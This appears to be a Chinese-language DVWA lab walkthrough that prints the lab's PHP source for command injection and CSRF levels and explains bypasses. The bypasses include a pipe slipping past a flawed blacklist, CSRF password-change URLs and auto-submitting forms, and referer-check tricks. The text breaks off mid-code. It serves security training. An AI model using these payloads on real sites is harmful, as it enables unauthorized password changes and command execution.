<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'Submit'</span> ]  ) ) {<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$target</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">'ip'</span> ]);<br>    <span class="hljs-comment">// Set blacklist</span><br>    <span class="hljs-variable">$substitutions</span> = <span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">'&amp;'</span>  =&gt; <span class="hljs-string">''</span>,<br>        <span class="hljs-string">';'</span>  =&gt; <span class="hljs-string">''</span>,<br>        <span class="hljs-string">'| '</span> =&gt; <span class="hljs-string">''</span>,<br>        <span class="hljs-string">'-'</span>  =&gt; <span class="hljs-string">''</span>,<br>        <span class="hljs-string">'$'</span>  =&gt; <span class="hljs-string">''</span>,<br>        <span class="hljs-string">'('</span>  =&gt; <span class="hljs-string">''</span>,<br>        <span class="hljs-string">')'</span>  =&gt; <span class="hljs-string">''</span>,<br>        <span class="hljs-string">'`'</span>  =&gt; <span class="hljs-string">''</span>,<br>        <span class="hljs-string">'||'</span> =&gt; <span class="hljs-string">''</span>,<br>    );<br>    <span class="hljs-comment">// Remove any of the characters in the array (blacklist).</span><br>    <span class="hljs-variable">$target</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-title function_ invoke__">array_keys</span>( <span class="hljs-variable">$substitutions</span> ), <span class="hljs-variable">$substitutions</span>, <span class="hljs-variable">$target</span> );<br><br>    <span class="hljs-comment">// Determine OS and execute the ping command.</span><br>    <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">stristr</span>( <span class="hljs-title function_ invoke__">php_uname</span>( <span class="hljs-string">'s'</span> ), <span class="hljs-string">'Windows NT'</span> ) ) {<br>        <span class="hljs-comment">// Windows</span><br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>( <span class="hljs-string">'ping  '</span> . <span class="hljs-variable">$target</span> );<br>    }<br>    <span class="hljs-keyword">else</span> {<br>        <span class="hljs-comment">// *nix</span><br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>( <span class="hljs-string">'ping  -c 4 '</span> . <span class="hljs-variable">$target</span> );<br>    }<br><br>    <span class="hljs-comment">// Feedback for the end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;<span class="hljs-subst">{$cmd}</span>&lt;/pre&gt;"</span>;<br>}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p><code>trim</code>：trim — 去除字符串首尾处的空白字符（或者其他字符）</p>
<p>如上所示，这串代码先用trim去除了IP参数内容的空格等字符，随后用更加严格的黑名单进行了过滤。虽然看着很全，但仔细观察会发现，其对|的过滤实际上是这样的<code>| </code>附加了一个空格，这估计是模拟现实中开发人员的失误。这意味着我们使用|依旧可以命令执行</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111201008732.png" alt="image-20240111201008732"></p>
<h2 id="Impossible-2">Impossible</h2>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'Submit'</span> ]  ) ) {<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">'user_token'</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">'session_token'</span> ], <span class="hljs-string">'index.php'</span> );<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$target</span> = <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">'ip'</span> ];<br>    <span class="hljs-variable">$target</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$target</span> );<span class="hljs-comment">//去除反斜杠\字符</span><br><br>    <span class="hljs-comment">// Split the IP into 4 octects</span><br>    <span class="hljs-variable">$octet</span> = <span class="hljs-title function_ invoke__">explode</span>( <span class="hljs-string">"."</span>, <span class="hljs-variable">$target</span> );<span class="hljs-comment">//将IP使用.符号分隔开</span><br>    <span class="hljs-comment">// Check IF each octet is an integer</span><br>    <span class="hljs-comment">//这里限制死了IP的每一段都需要为整数，且整个IP只能有四个网段</span><br>    <span class="hljs-keyword">if</span>( ( <span class="hljs-title function_ invoke__">is_numeric</span>( <span class="hljs-variable">$octet</span>[<span class="hljs-number">0</span>] ) ) &amp;&amp; ( <span class="hljs-title function_ invoke__">is_numeric</span>( <span class="hljs-variable">$octet</span>[<span class="hljs-number">1</span>] ) ) &amp;&amp; ( <span class="hljs-title function_ invoke__">is_numeric</span>( <span class="hljs-variable">$octet</span>[<span class="hljs-number">2</span>] ) ) &amp;&amp; ( <span class="hljs-title function_ invoke__">is_numeric</span>( <span class="hljs-variable">$octet</span>[<span class="hljs-number">3</span>] ) ) &amp;&amp; ( <span class="hljs-title function_ invoke__">sizeof</span>( <span class="hljs-variable">$octet</span> ) == <span class="hljs-number">4</span> ) ) {<br>        <span class="hljs-comment">// If all 4 octets are int's put the IP back together.</span><br>        <span class="hljs-variable">$target</span> = <span class="hljs-variable">$octet</span>[<span class="hljs-number">0</span>] . <span class="hljs-string">'.'</span> . <span class="hljs-variable">$octet</span>[<span class="hljs-number">1</span>] . <span class="hljs-string">'.'</span> . <span class="hljs-variable">$octet</span>[<span class="hljs-number">2</span>] . <span class="hljs-string">'.'</span> . <span class="hljs-variable">$octet</span>[<span class="hljs-number">3</span>];<br><br>        <span class="hljs-comment">// Determine OS and execute the ping command.</span><br>        <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">stristr</span>( <span class="hljs-title function_ invoke__">php_uname</span>( <span class="hljs-string">'s'</span> ), <span class="hljs-string">'Windows NT'</span> ) ) {<br>            <span class="hljs-comment">// Windows</span><br>            <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>( <span class="hljs-string">'ping  '</span> . <span class="hljs-variable">$target</span> );<br>        }<br>        <span class="hljs-keyword">else</span> {<br>            <span class="hljs-comment">// *nix</span><br>            <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>( <span class="hljs-string">'ping  -c 4 '</span> . <span class="hljs-variable">$target</span> );<br>        }<br><br>        <span class="hljs-comment">// Feedback for the end user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;<span class="hljs-subst">{$cmd}</span>&lt;/pre&gt;"</span>;<br>    }<br>    <span class="hljs-keyword">else</span> {<br>        <span class="hljs-comment">// Ops. Let the user name theres a mistake</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;'</span>;<br>    }<br>}<br><span class="hljs-comment">// Generate Anti-CSRF token</span><br><span class="hljs-title function_ invoke__">generateSessionToken</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>如上所示，这里先是判断用户令牌，防止了CSRF攻击，接着去除了IP参数的反斜杠字符，然后将IP内容以点号分隔开，分别判断得到的数组每一位数组元素是否为整数，且整个数组长度只能为4，否则将被视为无效IP。</p>
<p>这种就是白名单过滤的方式了，只要不符合正确的IP格式，则抛出错误，这里我们是无法绕过的。</p>
<h1>0x03 CSRF</h1>
<h2 id="Low-3">Low</h2>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">'Change'</span> ] ) ) {<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$pass_new</span>  = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">'password_new'</span> ];<br>    <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">'password_conf'</span> ];<br><br>    <span class="hljs-comment">// Do the passwords match?</span><br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$pass_new</span> == <span class="hljs-variable">$pass_conf</span> ) {<br>        <span class="hljs-comment">// They do!</span><br>        <span class="hljs-variable">$pass_new</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>],  <span class="hljs-variable">$pass_new</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));<br>        <span class="hljs-variable">$pass_new</span> = <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-variable">$pass_new</span> );<br><br>        <span class="hljs-comment">// Update the database</span><br>        <span class="hljs-variable">$insert</span> = <span class="hljs-string">"UPDATE `users` SET password = '<span class="hljs-subst">$pass_new</span>' WHERE user = '"</span> . <span class="hljs-title function_ invoke__">dvwaCurrentUser</span>() . <span class="hljs-string">"';"</span>;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>],  <span class="hljs-variable">$insert</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">'&lt;pre&gt;'</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">'&lt;/pre&gt;'</span> );<br><br>        <span class="hljs-comment">// Feedback for the user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;<br>    }<br>    <span class="hljs-keyword">else</span> {<br>        <span class="hljs-comment">// Issue with passwords matching</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;<br>    }<br><br>    ((<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);<br>}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>这里直接对用户输入的密码判断是否在两次输入中相等，如果相等，就直接更新密码，并没有对访问来源等做出限制</p>
<p>很明显这里并不能有效的阻止CSRF的存在，如果用户访问我们精心构造的恶意链接，就会造成CSRF，造成恶意代码执行。攻击思路如下：</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/dvwa/vulnerabilities/csrf/?password_new=<span class="hljs-number">123456</span>&amp;password_conf=<span class="hljs-number">123456</span>&amp;Change=Change&amp;user_token=<span class="hljs-number">6</span>cfafc0462102ccd10970a2c8e8fa780#<br></code></pre></td></tr></tbody></table></figure>
<p>如果用户在当前网站访问上述链接，那就会执行密码修改的功能。倘若这时候我们知道了用户名，则我们可以成功冒充用户登录。当然如果对方有点防范意识的话，就不会点击上述很明显可疑的网址，那我们先搞一个简单的短网址来攻击。</p>
<p>在线工具：<a target="_blank" rel="noopener" href="https://tool.chinaz.com/tools/dwz.aspx">https://tool.chinaz.com/tools/dwz.aspx</a></p>
<p>生成如下：<a target="_blank" rel="noopener" href="http://i7q.cn/5UMMrV">http://i7q.cn/5UMMrV</a></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111203914143.png" alt="image-20240111203914143"></p>
<p>可以看到成功伪造</p>
<h3 id="配合XSS">配合XSS</h3>
<p>这种 XSS 和 CSRF 结合成功率很高，攻击更加隐蔽。首先新建一个带有 xss 攻击语句的 html 页面，内容如下：</p>
<figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>XSS&amp;CSRF<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change&amp;user_token=6cfafc0462102ccd10970a2c8e8fa780#"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>当受害者访问含有这个html代码的页面的时候，用户的密码就被恶意修改了。</p>
<p>核心语句就是通过 <code>scirpt</code> 标签的 src 属性来记载攻击 payload 的 URL。当然还可以使用iframe、img等标签</p>
<h2 id="Medium-3">Medium</h2>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">'Change'</span> ] ) ) {<br>    <span class="hljs-comment">// Checks to see where the request came from</span><br>    <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">stripos</span>( <span class="hljs-variable">$_SERVER</span>[ <span class="hljs-string">'HTTP_REFERER'</span> ] ,<span class="hljs-variable">$_SERVER</span>[ <span class="hljs-string">'SERVER_NAME'</span> ]) !== <span class="hljs-literal">false</span> ) {<br>        <span class="hljs-comment">// Get input</span><br>        <span class="hljs-variable">$pass_new</span>  = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">'password_new'</span> ];<br>        <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">'password_conf'</span> ];<br>        <span class="hljs-comment">// Do the passwords match?</span><br>        <span class="hljs-keyword">if</span>( <span class="hljs-variable">$pass_new</span> == <span class="hljs-variable">$pass_conf</span> ) {<br>            <span class="hljs-comment">// They do!</span><br>            <span class="hljs-variable">$pass_new</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>],  <span class="hljs-variable">$pass_new</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));<br>            <span class="hljs-variable">$pass_new</span> = <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-variable">$pass_new</span> );<br><br>            <span class="hljs-comment">// Update the database</span><br>            <span class="hljs-variable">$insert</span> = <span class="hljs-string">"UPDATE `users` SET password = '<span class="hljs-subst">$pass_new</span>' WHERE user = '"</span> . <span class="hljs-title function_ invoke__">dvwaCurrentUser</span>() . <span class="hljs-string">"';"</span>;<br>            <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>],  <span class="hljs-variable">$insert</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">'&lt;pre&gt;'</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">'&lt;/pre&gt;'</span> );<br><br>            <span class="hljs-comment">// Feedback for the user</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;<br>        }<br>        <span class="hljs-keyword">else</span> {<br>            <span class="hljs-comment">// Issue with passwords matching</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;<br>        }<br>    }<br>    <span class="hljs-keyword">else</span> {<br>        <span class="hljs-comment">// Didn't come from a trusted source</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;That request didn't look correct.&lt;/pre&gt;"</span>;<br>    }<br><br>    ((<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);<br>}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>关键代码如下</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">stripos</span>( <span class="hljs-variable">$_SERVER</span>[ <span class="hljs-string">'HTTP_REFERER'</span> ] ,<span class="hljs-variable">$_SERVER</span>[ <span class="hljs-string">'SERVER_NAME'</span> ]) !== <span class="hljs-literal">false</span> ) <br></code></pre></td></tr></tbody></table></figure>
<ol>
<li><code>$_SERVER[ 'HTTP_REFERER' ]</code>: 这是一个 HTTP 请求头，它包含了当前请求的来源页面的 URL。</li>
<li><code>$_SERVER[ 'SERVER_NAME' ]</code>: 这是当前服务器的主机名。</li>
</ol>
<p>这里判断用户访问该网站的来源地址是否与网站的host相同，如果不相同这说明来源有问题。如果一致，则认为是真正的用户，接着更新密码，同时拒绝了SQL注入。同时这关放弃了token的检验</p>
<p>这里就是考察我们对于<code>stripos</code>的理解了，由于该函数只是判断待查询字符串是否<strong>包含</strong>指定的字符，这意味着我们造构造恶意网址的时候，只需要在网址中包含与正确网站的host_name相同的部分即可</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111205025972.png" alt="image-20240111205025972"></p>
<p>首先精心构造一个HTML页面</p>
<figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>CSRF<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">from</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"get"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"csrf"</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"http://127.0.0.1/dvwa/vulnerabilities/csrf/"</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"password_new"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"123456"</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"password_conf"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"123456"</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"change"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"123456"</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">forms</span>[<span class="hljs-string">'csrf'</span>].<span class="hljs-title function_">submit</span>();</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>当用户访问该页面的时候由于<code>&lt;script&gt;document.forms['csrf'].submit();&lt;/script&gt;</code>的执行，导致用户自动提交给了上面表单内容，进行密码的修改。</p>
<p>接下来就是对于该html页面网址的构造了</p>
<p>**目录混淆：**将上述 html 页面放到服务器的 <code>127.0.0.1</code> 目录下，然后让用户访问自动触发提交然后访问构造好的 payload 地址：</p>
<figure class="highlight http"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://www.sqlsec.com/127.0.0.1/csrf.html<br></code></pre></td></tr></tbody></table></figure>
<p>**文件名混淆：**将上述 html 文件重命名为 <code>127.0.0.1.html</code>，然后访问如下 payload：</p>
<figure class="highlight http"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://www.sqlsec.com/127.0.0.1.html<br></code></pre></td></tr></tbody></table></figure>
<p>这里有师傅提醒：<strong>这里有一个小细节，如果目标网站是 http 的话，那么 csrf 的这个 html 页面也要是 http 协议，如果是 https 协议的话 就会失败，具体自行测试。</strong></p>
<p><strong>？拼接混淆referer</strong>：</p>
<figure class="highlight http"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://www.sqlsec.com/csrf.html?127.0.0.1<br></code></pre></td></tr></tbody></table></figure>
<p>因为？后默认当做参数传递，这里因为 html 页面是不能接受参数的，所以随便输入是不影响实际的结果的，利用这个特点来绕过 referer 的检测。</p>
<h2 id="High-3">High</h2>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'REQUEST_METHOD'</span>] == <span class="hljs-string">"POST"</span> &amp;&amp; <span class="hljs-title function_ invoke__">array_key_exists</span> (<span class="hljs-string">"CONTENT_TYPE"</span>, <span class="hljs-variable">$_SERVER</span>) &amp;&amp; <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'CONTENT_TYPE'</span>] == <span class="hljs-string">"application/json"</span>) {<br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">'php://input'</span>), <span class="hljs-literal">true</span>);<br>    <span class="hljs-variable">$request_type</span> = <span class="hljs-string">"json"</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">array_key_exists</span>(<span class="hljs-string">"HTTP_USER_TOKEN"</span>, <span class="hljs-variable">$_SERVER</span>) &amp;&amp;<br>        <span class="hljs-title function_ invoke__">array_key_exists</span>(<span class="hljs-string">"password_new"</span>, <span class="hljs-variable">$data</span>) &amp;&amp;<br>        <span class="hljs-title function_ invoke__">array_key_exists</span>(<span class="hljs-string">"password_conf"</span>, <span class="hljs-variable">$data</span>) &amp;&amp;<br>        <span class="hljs-title function_ invoke__">array_key_exists</span>(<span class="hljs-string">"Change"</span>, <span class="hljs-variable">$data</span>)) {<br>        <span class="hljs-variable">$token</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'HTTP_USER_TOKEN'</span>];<br>        <span class="hljs-variable">$pass_new</span> = <span 